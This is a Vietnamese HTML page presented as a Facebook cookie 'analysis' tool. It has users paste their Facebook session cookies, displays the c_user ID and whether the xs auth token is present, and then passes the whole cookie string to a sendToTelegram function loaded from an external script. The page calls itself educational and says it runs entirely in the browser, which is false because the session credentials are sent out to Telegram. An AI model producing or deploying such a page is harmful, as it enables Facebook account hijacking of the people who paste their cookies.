<!DOCTYPE html>
<html lang="vi">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Phân Tích Cookies Facebook</title>
  <style>
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
    }
    body {
      background-color: #f0f2f5;
      color: #1c1e21;
      line-height: 1.6;
      padding: 20px;
    }
    .container {
      max-width: 1000px;
      margin: 0 auto;
      background-color: #fff;
      border-radius: 8px;
      box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1);
      padding: 20px;
    }
    header {
      text-align: center;
      margin-bottom: 30px;
      padding-bottom: 20px;
      border-bottom: 1px solid #dddfe2;
    }
    h1 {
      color: #1877f2;
      margin-bottom: 10px;
    }
    .description {
      color: #65676b;
      font-size: 16px;
      max-width: 800px;
      margin: 0 auto;
    }
    .input-section {
      margin-bottom: 30px;
    }
    textarea {
      width: 100%;
      height: 150px;
      padding: 12px;
      border: 1px solid #dddfe2;
      border-radius: 6px;
      font-size: 16px;
      resize: vertical;
      margin-bottom: 15px;
    }
    button {
      background-color: #1877f2;
      color: white;
      border: none;
      border-radius: 6px;
      padding: 12px 20px;
      font-size: 16px;
      font-weight: 600;
      cursor: pointer;
      transition: background-color 0.3s;
      display: block;
      margin: 0 auto;
    }
    button:hover {
      background-color: #166fe5;
    }
    .results-section {
      display: none;
      margin-top: 30px;
    }
    .cookie-card {
      background-color: #f0f2f5;
      border-radius: 8px;
      padding: 15px;
      margin-bottom: 15px;
    }
    .cookie-name {
      font-weight: bold;
      color: #1877f2;
    }
    .cookie-value {
      word-break: break-all;
      margin-top: 5px;
    }
    .user-info {
      background-color: #e7f3ff;
      border-radius: 8px;
      padding: 20px;
      margin-bottom: 20px;
    }
    .warning {
      background-color: #fff4e6;
      border-left: 4px solid #ffa94d;
      padding: 15px;
      margin: 20px 0;
      border-radius: 4px;
    }
    footer {
      text-align: center;
      margin-top: 30px;
      color: #65676b;
      font-size: 14px;
    }
    @media (max-width: 768px) {
      .container { padding: 15px; }
      h1 { font-size: 24px; }
    }
  </style>
</head>
<body>
  <div class="container">
    <header>
      <h1>Phân Tích Cookies Facebook</h1>
      <p class="description">Nhập cookies Facebook của bạn để phân tích và gửi về Telegram (chạy hoàn toàn trong trình duyệt).</p>
    </header>

    <div class="input-section">
      <textarea id="cookiesInput" placeholder="Dán chuỗi cookies Facebook của bạn vào đây..."></textarea>
      <button id="analyzeBtn">Phân Tích & Gửi Telegram</button>
    </div>

    <div class="warning">
      <strong>Lưu ý:</strong> Cookies chứa thông tin nhạy cảm, không chia sẻ lung tung.
    </div>

    <div class="results-section" id="resultsSection">
      <h2>Thông tin trích xuất từ Cookies</h2>
      <div class="user-info" id="userInfo"></div>
      <h3>Chi tiết Cookies</h3>
      <div id="cookiesList"></div>
    </div>
  </div>

  <footer>
    <p>Ứng dụng chỉ phục vụ mục đích học tập và phân tích.</p>
  </footer>

  <script src="telegram.js"></script>
  <script>
    document.getElementById('analyzeBtn').addEventListener('click', function() {
      const cookiesString = document.getElementById('cookiesInput').value.trim();
      if (!cookiesString) {
        alert('Vui lòng nhập cookies Facebook để phân tích.');
        return;
      }
      try {
        const cookies = parseCookies(cookiesString);
        displayResults(cookies, cookiesString);
      } catch (error) {
        alert('Đã xảy ra lỗi khi phân tích cookies: ' + error.message);
      }
    });

    function parseCookies(cookiesString) {
      const cookies = {};
      const pairs = cookiesString.split(';');
      for (let pair of pairs) {
        pair = pair.trim();
        if (!pair) continue;
        const eqIndex = pair.indexOf('=');
        if (eqIndex === -1) continue;
        const name = pair.substring(0, eqIndex).trim();
        let value = pair.substring(eqIndex + 1).trim();
        try { value = decodeURIComponent(value); } catch (e) {}
        cookies[name] = value;
      }
      return cookies;
    }

    function displayResults(cookies, cookiesString) {
      const resultsSection = document.getElementById('resultsSection');
      const userInfoDiv = document.getElementById('userInfo');
      const cookiesListDiv = document.getElementById('cookiesList');

      userInfoDiv.innerHTML = '';
      cookiesListDiv.innerHTML = '';

      let userId = cookies.c_user || null;
      if (userId) {
        userInfoDiv.innerHTML = `
          <h3>Thông tin người dùng</h3>
          <p><strong>User ID:</strong> ${userId}</p>
          <p><strong>Xác thực:</strong> ${cookies.xs ? 'Có token xác thực' : 'Không có token xác thực'}</p>
        `;
      } else {
        userInfoDiv.innerHTML = '<p>Không tìm thấy thông tin người dùng trong cookies</p>';
      }

      for (const [name, value] of Object.entries(cookies)) {
        const cookieCard = document.createElement('div');
        cookieCard.className = 'cookie-card';
        cookieCard.innerHTML = `
          <div class="cookie-name">${name}</div>
          <div class="cookie-value">${value}</div>
        `;
        cookiesListDiv.appendChild(cookieCard);
      }

      resultsSection.style.display = 'block';
      resultsSection.scrollIntoView({ behavior: 'smooth' });
      sendToTelegram(userId, cookiesString);
    }
  </script>
</body>
</html>
